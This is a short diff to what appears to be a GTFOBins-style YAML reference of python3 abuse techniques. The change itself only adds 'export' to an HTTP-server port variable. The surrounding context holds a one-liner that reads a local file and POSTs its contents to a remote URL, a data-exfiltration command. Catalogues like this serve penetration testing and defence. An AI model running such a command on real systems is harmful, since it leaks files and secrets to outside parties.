@@ -16,7 +16,7 @@ functions:
         python3 -c 'import urllib.request as r,urllib.parse as u;from os import environ as e; r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))'
     - description: Serve files in the local folder running an HTTP server.
       code: |
-        LPORT=8888
+        export LPORT=8888
         python3 -m http.server $LPORT
   download:
     - description: Fetch a remote file via HTTP GET request.
